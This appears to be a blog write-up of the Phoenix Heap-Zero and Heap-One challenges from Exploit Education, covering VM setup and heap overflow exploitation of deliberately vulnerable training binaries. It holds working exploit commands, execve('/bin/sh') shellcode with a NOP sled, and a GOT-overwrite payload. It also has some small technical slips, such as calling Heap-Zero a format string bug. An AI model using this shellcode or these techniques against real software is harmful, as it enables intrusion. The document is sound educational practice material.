---
layout: phoenix
title: "Welcome to Jekyll!"
date: 2025-04-06 12:26:40 +0530
categories: jekyll update
---

---

#  Phoenix:

**Phoenix** is the first part of the binary exploitation learning series by [Exploit Education](https://exploit.education/).

---

##  Getting Started

You can download the Phoenix challenge files from the official page:

 [exploit.education/downloads](https://exploit.education/downloads/)

> ⚠️ At the time of writing, the prebuilt repo wasn’t available.
> So, I built the VM manually using QEMU — and I’ll show you how to do the same!

---

## For Windows Users

### 1. **Download the Image**

* Choose the `amd64` version (or whichever matches your architecture).
* Format: `.qcow2` image inside a `.zip` file.

### 2. **Extract & Navigate**

```bash
unzip phoenix-amd64.zip
cd phoenix-amd64/
```

### 3. **Install QEMU**

QEMU is required to emulate the VM.
For best compatibility, run it through **WSL (Windows Subsystem for Linux)**.

Install QEMU (on WSL):

```bash
sudo apt update && sudo apt install qemu-system-x86
```

---

### 4. **Launch the VM**

Run the following from the extracted image directory:

```bash
qemu-system-x86_64 \
  -m 512M \
  -kernel ./vmlinuz-4.9.0-8-amd64 \
  -initrd ./initrd.img-4.9.0-8-amd64 \
  -hda ./exploit-education-phoenix-amd64.qcow2 \
  -append "root=/dev/sda1 console=ttyS0" \
  -nographic
```

---

## Default Credentials

| Username | `user`   |
| -------- | -------- |
| Passowrd | `user`   |

---

## Accessing the Challenges

Once logged in:

```bash
cd /opt/phoenix/amd64
```

Replace `amd64` with your architecture if you're using a different one.

---

## You're In!

If everything worked, your terminal (via WSL) should show a login prompt and boot into the Phoenix VM. From here, you can start working on the binary exploitation challenges.

> Pro Tip: Use `tmux` or split terminals to keep debugger sessions, source code, and shell access visible at the same time.

---

<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>

---

# Heap-Zero:

**Challenge**: [Phoenix/Heap-Zero](https://exploit.education/phoenix/heap-zero/)

**Goal**: Overflow the buffer and change the value of the `changeme` variable using a **format string vulnerability**.

---

## Quick History

From [Wikipedia](https://en.wikipedia.org/wiki/Heap_overflow):

> *A heap overflow, heap overrun, or heap smashing is a type of `buffer overflow` that occurs in the heap data area. Heap overflows are exploitable in a different manner to that of stack-based overflows. Memory on the heap is dynamically allocated at runtime and typically contains program data. Exploitation is performed by corrupting this data in specific ways to cause the application to overwrite internal structures such as linked list `pointers`. The canonical heap overflow technique overwrites `dynamic memory allocation linkage` (such as `malloc` metadata) and uses the resulting pointer exchange to overwrite a program `function pointer`.*

⚡ **Takeaway**:  You can corrupt heap-managed metadata or adjacent `heap` data (like a function pointer) to change `program control flow`.

---

## Starting the Challenge

![binary-start](/assets/phoenix-heap/welcome.png)



At the start, we see:

```
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x804884e
level has not been passed - function pointer has not been overwritten
```

Clearly, our mission is to *overflow* the`function pointer`. 🚩


nm ./heap-zero

```
08049068 t sYSTRIm
         U sbrk
0804c2c4 B stderr
0804c2c0 B stdout
         U strcpy
         U sysconf
0804a7b0 T valloc
08048835 T winner
```

we see a winner `08048835` function,

yes, this is the thing we need to call,

```
(gdb) disassemble winner
Dump of assembler code for function winner:
   0x08048835 <+0>:     push   %ebp
   0x08048836 <+1>:     mov    %esp,%ebp
   0x08048838 <+3>:     sub    $0x8,%esp
   0x0804883b <+6>:     sub    $0xc,%esp
   0x0804883e <+9>:     push   $0x804abd0
   0x08048843 <+14>:    call   0x8048600 <puts@plt>
   0x08048848 <+19>:    add    $0x10,%esp
   0x0804884b <+22>:    nop
   0x0804884c <+23>:    leave
   0x0804884d <+24>:    ret
End of assembler dump.
(gdb) x/s 0x804abd0
0x804abd0:      "Congratulations, you have passed this level"
(gdb)

```

---

## Strategy

Here, its calling some address `0x804abd0`, lets add some 72 bytes worth of buffer?

So, the disassembly will give us what code is exactly doing i.e. number of byte allocation in malloc,

We’ll need to:

* our base address is 0xf7e69008.
* our target address is 0xf7e69050.
* We need to just overflow it with 0x804abd0.
* substracting the address we get 72 bytes.
 

`payload` is like `72*A + 0x804abd0`

---
## Exploit

writing out our exploit:

```
./heap-zero "$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\x35\x88\x04\x08')")" 
```

![passed](/assets/phoenix-heap/passed.png)

---

## Injecting Shellcode

On amd64 we ran into problems with NUL (`\x00`) and newline (`\x0a`) bytes when trying to place raw addresses into argv. Important constraints:

* `argv[]` entries are C strings and **cannot contain NUL** bytes dur to `strcpy()`.
* Shell command substitution and quoting can be broken by newlines or unescaped bytes.

script:

```
import struct

address = struct.pack('Q',0x7fffffffeec1-20)

shellcode = (
    b"\x48\x31\xd2"
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
    b"\x48\xc1\xeb\x08"
    b"\x53"
    b"\x48\x89\xe7"
    b"\x50"
    b"\x57"
    b"\x48\x89\xe6"
    b"\xb0\x3b"
    b"\x0f\x05"
)

length = 72 - len(shellcode)

print(b"\x90" * 8 + shellcode + b"A" * length + address)

```

Because of those constraints, you used a **shellcode injection + return address** approach on amd64.

---

## amd64 shellcode-style exploit (script used)

Replace the address with the exact address observed in gdb.

```python
#!/usr/bin/env python3
import struct

# pick the address you saw in gdb where the shellcode/buffer will reside
# example: 0x7fffffffeec1 - 20
address = struct.pack('Q', 0x7fffffffeec1 - 20)

shellcode = (
    b"\x48\x31\xd2"
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
    b"\x48\xc1\xeb\x08"
    b"\x53"
    b"\x48\x89\xe7"
    b"\x50"
    b"\x57"
    b"\x48\x89\xe6"
    b"\xb0\x3b"
    b"\x0f\x05"
)

length = 72 - len(shellcode)

print(b"\x90" * 8 + shellcode + b"A" * length + address)
```

> Note: replace `0x7fffffffeec1-20` with the exact address you verified in gdb. In GDB I got buffer around 0xeec1 by observing sp and ip, I decremented the address by 20 bytes.

* NOP sled (0x90s)
* execve("/bin/sh") shellcode
* padding up to the saved RIP overwrite
* 8-byte little-endian return address (to jump into the NOP/shellcode area)

Write the payload to a file and use it in gdb:

```bash
python3 /tmp/qaz.py > /tmp/payload.bin
gdb --args ./heap-zero zero
# inside gdb:
(gdb) run < /tmp/payload.bin
```

Or, if the program opens the filename passed in argv:

```bash
./heap-zero $(python /tmp/qaz.py)
```
![alt text](/assets/phoenix-heap/image-2.png)

---

## Recommendations / debugging tips

* Use gdb to confirm layout:

  * `info registers rip rsp rbp`
  * `x/256bx <buffer_address>`
  * `x/4gx $rbp`       (view saved rbp and saved rip if frame pointers used)
  * `x/10i <buffer_address>` (disassemble where you will land)
  * `info proc mappings` (check NX/permissions)

* If you see decoder junk like `rex.X` when disassembling, it usually means you returned into ASCII bytes (`0x40`–`0x4f` are REX prefixes). Fix by placing a NOP sled (`0x90`) before the shellcode or ensure the return address points to a valid opcode.

* **Argv cannot contain NUL bytes.** To pass binary data with NULs use:

  * a temporary file and pass its filename
  * stdin (pipe or redirection)
  * process substitution (`/dev/fd/N`) or FIFO

* Use little-endian packing for addresses:

  * 32-bit: `struct.pack("<I", addr)`
  * 64-bit: `struct.pack("<Q", addr)`

* For realistic targets prefer ROP / ret2libc where NX is enabled. On this host `checksec` showed NX disabled and RWX segments present, which allowed stack/heap shellcode execution.

---
<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>
---

# Heap-One:

**Challenge**: [Phoenix/Heap-One](https://exploit.education/phoenix/heap-one/)

**Goal**: Overflow the heap and change the address of the `puts@got.plt` to  **winner address**.

---

## 📌 Quick Background

From **Wikipedia**:

> *A heap overflow, heap overrun, or heap smashing is a type of buffer overflow that occurs in the heap data area. Heap overflows are exploitable in a different manner to that of stack-based overflows. Memory on the heap is dynamically allocated at runtime and typically contains program data. Exploitation is performed by corrupting this data in specific ways to cause the application to overwrite internal structures such as linked list pointers. The canonical heap overflow technique overwrites dynamic memory allocation linkage (such as malloc metadata) and uses the resulting pointer exchange to overwrite a program function pointer.*

**⚡ Takeaway:**
Heap overflows allow corruption of heap metadata or adjacent heap chunks to change control flow — often via pointer overwrites.

---

##  Starting the Challenge

Running the binary:

```
$ ./heap-one
[ 2216.609667] heap-one[328]: segfault at 0 ip 00000000f7f840f1 sp 00000000ffffdd14 error 4 in libc.so[f7f6d000+8d000]
Segmentation fault
```

Testing with larger arguments (64 bytes):

```
[ 2192.364105] heap-one[327]: segfault at 0 ip 00000000f7f840d6 sp 00000000ffffdcd4 error 4 in libc.so[f7f6d000+8d000]

```

Different values appear for `ip` and `sp`, but the program still crashes — a clear sign something interesting is happening on the heap.

---

## 🔧 Inspecting the Binary

```
nm ./heap-one
```

We discover:

```
0804889a T winner
```

Let’s inspect this function:

```gdb
(gdb) disassemble winner
```

```asm
0x0804889a <+0>:   push   %ebp
0x080488a3 <+9>:   push   $0x0
0x080488a5 <+11>:  call   time
0x080488b1 <+23>:  push   $msg
0x080488b6 <+28>:  call   printf
```

And the message:

```gdb
(gdb) x/s 0x804ab8c
"Congratulations, you've completed this level..."
```

So our goal is to redirect code execution to `winner()`.

---

## Understanding the Program (C Source)

```c
struct heapStructure {
  int priority;
  char *name;
};

int main(int argc, char **argv) {
  struct heapStructure *i1, *i2;

  i1 = malloc(sizeof(struct heapStructure));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct heapStructure));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

### 📌 Observations

* Both `name` pointers are allocated using `malloc(8)` → **small, adjacent heap chunks**.
* `strcpy()` copies user input **without bounds checking**.
* Overflowing `i1->name` will overwrite heap metadata **or the fields of `i2`**.
* After both `strcpy()` calls, the program calls:

```c
printf("and that's a wrap folks!\n");
```

### ⚡ GOT Overwrite Idea

We can overwrite a **Global Offset Table (GOT)** entry: specifically the one for `puts`, which is later called by `printf` internally.

We cant here realistically do stack smashing or anything else due to fact we have vulnerabilty surrounding heap area and stack region or eip of main is very far from heap region.

The structure:

Replace:

```
puts@got = address_of(winner)
```

When the program tries to call `puts()`, it will execute `winner()` instead.

---

## Inspecting the GOT Entry for puts()

```gdb
(gdb) x/10i 0x80485b0
```

We find:

```
0x804c140 <puts@got.plt>: 0x80485b6
```

And the winner function:

```
winner @ 0x0804889a
```

If we set:

```gdb
set {int}0x804c140 = 0x804889a
```

the program prints the winning message.

This confirms our target.

---

## Locating the Heap Chunks

Set a breakpoint after the second `strcpy()`:

```
b *0x08048878
run AAAAAAAA BBBBBBBB
```

Inspect registers:

```
   0x08048871 <+156>:   push   edx
   0x08048872 <+157>:   push   eax
   0x08048873 <+158>:   call   0x8048560 <strcpy@plt>
```

the edx here is the source or arg value (in disassembly we would see environment variables, other good stuff)

and eax is actual heap pointer to i1->name and i2->name (1st strcpy@plt and 2nd strcpy@plt)


```
eax = i2->name  (destination of second strcpy)
```

Dump around that region:

```
x/40wx $eax-40
```

Output:

```
0xf7e69010:     0x00000000      0x00000011      0x41414141      0x41414141
0xf7e69020:     0x00000000      0x00000011      0x00000002      0xf7e69038
0xf7e69030:     0x00000000      0x00000011      0x42424242      0x42424242
0xf7e69040:     0x00000000      0x000fffc1      0x00000000      0x00000000
0xf7e69050:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69060:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69070:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69080:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69090:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690a0:     0x00000000      0x00000000      0x00000000      0x00000000

```

The distance between `i1->name` and `i2->name` is:

```python
hex(0xf7e69038 - 0xf7e69018) == '0x20'
```

So overflowing `i1->name` by **20 bytes** lets us overwrite the pointer stored in `i2->name`.

That gives us full control over the **destination pointer** used by the second `strcpy()`.

---

## Final Exploit Strategy

1. `argv[1]` overflows `i1->name`
   → overwrite `i2->name` with the address of **puts@got**.

2. `argv[2]` becomes the *source* for the second `strcpy()`
   → copied **into the GOT entry**.

3. Payload #2 = address of `winner()`.

### Final Payload

```bash
./heap-one \
$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x40\xc1\x04\x08")') \
$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x9a\x88\x04\x08")')
```

* `b"A"*20` — padding up to overwrite point
* `b"\x40\xc1\x04\x08"` — `puts@got.plt`
* `b"\x9a\x88\x04\x08"` — `winner()`

---

# Result

Running the exploit:

```
Congratulations, you've completed this level @ 1763272634 seconds past the Epoch
```

Heap overflow → GOT overwrite → control-flow hijack → `winner()` executed!

---










